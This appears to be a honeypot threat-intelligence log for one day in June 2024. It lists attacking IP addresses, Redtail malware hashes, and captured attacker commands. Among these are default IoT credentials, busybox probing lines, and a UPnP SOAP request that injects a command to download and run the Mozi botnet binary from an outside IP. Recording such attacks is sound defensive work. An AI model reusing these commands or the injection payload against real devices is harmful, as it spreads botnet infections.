@@ -1,0 +1,69 @@
+Top 5 IPs for 2024-06-18 :
+
+64.225.17.80
+167.71.196.217
+118.70.170.120
+43.135.183.2
+125.23.27.26
+
+Malware Observed:
+
+
+File name : redtail.arm7
+ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+https://www.virustotal.com/gui/file/ea9f3911ff2884621874c1e98b5dc9139964adeab333b92816eb5c307d73a67f
+
+File name : redtail.arm8
+720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+https://www.virustotal.com/gui/file/720b3d089679f26e02c2f9bf05a466e768557b91627e840a2cd26eb480dc8418
+
+File name : redtail.i686
+9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+https://www.virustotal.com/gui/file/9ef2ef02376445bf4c145820c0c81f2bbe0b96f2017278562e0bd259bf7bd061
+
+File name : redtail.x86_64
+ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+https://www.virustotal.com/gui/file/ab897157fdef11b267e986ef286fd44a699e3699a458d90994e020619653d2cd
+
+
+
+Commands/exploits observed:
+
+root
+xc3511
+enable
+system
+shell
+sh
+ping; sh
+mount -o remount,rw,exec /tmp/; >/tmp/.a && cd /tmp/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/; >/var/.a && cd /var/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /dev/; >/dev/.a && cd /dev/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /mnt/; >/mnt/.a && cd /mnt/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/run/; >/var/run/.a && cd /var/run/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/tmp/; >/var/tmp/.a && cd /var/tmp/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /; >/.a && cd /;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /dev/netslink/; >/dev/netslink/.a && cd /dev/netslink/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /dev/shm/; >/dev/shm/.a && cd /dev/shm/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /bin/; >/bin/.a && cd /bin/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /etc/; >/etc/.a && cd /etc/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /boot/; >/boot/.a && cd /boot/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /usr/; >/usr/.a && cd /usr/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /sys/; >/sys/.a && cd /sys/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/home/user/fw/; >/var/home/user/fw/.a && cd /var/home/user/fw/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+for p in `cat /proc/mounts|grep tmpfs|cut -d ' ' -f 2`;do cat $SHELL >$p/.a&&cd $p;rm .a;done;(echo -e "\\x44\\x49\\x52"||/bin/busybox echo -e "\\x44\\x49\\x52")
+rm -rf .d; >.d; (cp $SHELL .d || /bin/busybox cp /bin/busybox .d || chmod 777 .d); >.d||rm -rf .d
+(/bin/busybox wget --help||wget --help)&&echo -e "\\x57\\x47\\x45\\x54"||(/bin/busybox ftpget --help||ftpget --help)&&echo -e "\\x46\\x54\\x50"||echo -en "\\x45\\x43\\x48\\x4f"
+
+
+
+
+POST /picsdesc.xml HTTP/1.1
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: /
+User-Agent: Hello-World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope//" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://182.116.115.175:33391/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
